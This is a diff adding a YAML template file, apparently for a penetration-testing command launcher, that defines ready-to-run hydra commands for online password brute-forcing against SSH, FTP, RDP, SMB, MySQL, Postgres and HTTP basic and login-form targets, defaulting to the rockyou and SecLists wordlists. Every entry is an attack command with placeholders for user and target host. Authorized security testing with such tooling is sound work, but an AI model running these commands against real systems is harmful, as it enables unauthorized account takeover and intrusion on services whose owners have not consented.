@@ -1,0 +1,27 @@
+---
+tool: hydra
+description: Online password brute-forcing with hydra
+
+actions:
+  - title: ssh
+    command: "hydra -l '{{un}}' -P {{ wordlist | default('/usr/share/wordlists/rockyou.txt') }} ssh://{{rhost}}"
+  - title: ssh-userlist
+    command: "hydra -L {{ userlist | default('/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt') }} -P {{ wordlist | default('/usr/share/wordlists/rockyou.txt') }} ssh://{{rhost}}"
+  - title: ftp
+    command: "hydra -l '{{un}}' -P {{ wordlist | default('/usr/share/wordlists/rockyou.txt') }} ftp://{{rhost}}"
+  - title: rdp
+    command: "hydra -l '{{un}}' -P {{ wordlist | default('/usr/share/wordlists/rockyou.txt') }} rdp://{{rhost}}"
+  - title: smb
+    command: "hydra -l '{{un}}' -P {{ wordlist | default('/usr/share/wordlists/rockyou.txt') }} smb://{{rhost}}"
+  - title: mysql
+    command: "hydra -l '{{un}}' -P {{ wordlist | default('/usr/share/wordlists/rockyou.txt') }} mysql://{{rhost}}"
+  - title: postgres
+    command: "hydra -l '{{un}}' -P {{ wordlist | default('/usr/share/wordlists/rockyou.txt') }} postgres://{{rhost}}"
+  - title: http-get
+    command: "hydra -l '{{un}}' -P {{ wordlist | default('/usr/share/wordlists/rockyou.txt') }} {{rhost}} http-get '/'"
+  - title: http-basic
+    command: "hydra -l '{{un}}' -P {{ wordlist | default('/usr/share/wordlists/rockyou.txt') }} -s 80 {{rhost}} http-get '/'"
+  - title: http-post-form
+    command: "hydra -l '{{un}}' -P {{ wordlist | default('/usr/share/wordlists/rockyou.txt') }} {{rhost}} http-post-form '/login:username=^USER^&password=^PASS^:F=Invalid'"
+  - title: https-post-form
+    command: "hydra -l '{{un}}' -P {{ wordlist | default('/usr/share/wordlists/rockyou.txt') }} {{rhost}} https-post-form '/login:username=^USER^&password=^PASS^:F=Invalid'"
